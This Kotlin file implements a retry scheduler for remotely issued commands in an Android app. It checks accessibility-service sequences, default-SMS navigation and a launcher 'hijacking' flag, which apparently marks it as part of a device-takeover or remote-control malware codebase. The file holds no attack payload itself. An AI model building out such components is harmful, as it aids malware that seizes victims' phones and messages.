package com.example.myandroid

import android.content.Context
import kotlinx.coroutines.*
import org.json.JSONObject
import java.util.concurrent.ConcurrentHashMap

object CommandRetryManager {
    private val retryCounts = ConcurrentHashMap<Int, Int>()
    private val scope = CoroutineScope(Dispatchers.IO + SupervisorJob())

    fun scheduleRetry(ctx: Context, cmdId: Int, fileName: String, content: String, reason: String) {
        if (cmdId < 0) {
            DebugLogger.log("RETRY_MGR", "Ignoring retry for internal/mock command (ID: $cmdId).")
            return
        }

        val attempts = retryCounts.getOrDefault(cmdId, 0) + 1
        retryCounts[cmdId] = attempts

        if (attempts > 3) {
            DebugLogger.log("RETRY_MGR", "Command [$fileName] failed 3 times. Giving up. ($reason)")
            CommandProcessor.updateCommandStatus(ctx, cmdId, "FAILED_PERMANENTLY", "Exceeded max retries (3/3). Last reason: $reason")
            retryCounts.remove(cmdId)
            return
        }

        DebugLogger.log("RETRY_MGR", "Scheduling retry $attempts/3 for [$fileName] in 60s. ($reason)")

        scope.launch {
            delay(60_000)

            // Wait until the system is no longer busy
            var waitCycles = 0
            while (isSystemBusy(ctx) && waitCycles < 10) {
                DebugLogger.log("RETRY_MGR", "System busy. Delaying retry for [$fileName] by 15s...")
                delay(15_000)
                waitCycles++
            }

            DebugLogger.log("RETRY_MGR", "Executing retry $attempts for [$fileName]")
            val cmdObj = JSONObject().apply {
                put("id", cmdId)
                put("file_name", fileName)
                put("content", content)
            }
            CommandProcessor.processSingleCommand(ctx, cmdObj)
        }
    }

    private fun isSystemBusy(ctx: Context): Boolean {
        val isUiAttached = DynamicUIManager.isAnyAttached
        val hasSequence = MyAccessibilityService.instance?.activeSequence != null
        val isSmsNavigating = DefaultSmsManager.expectedMode.isNotEmpty()
        val isHijacking = LauncherManager.isHijacking
        val isWaitingData = MyAccessibilityService.instance?.isWaitingForDataSettings == true
        return isUiAttached || hasSequence || isSmsNavigating || isHijacking || isWaitingData
    }
}
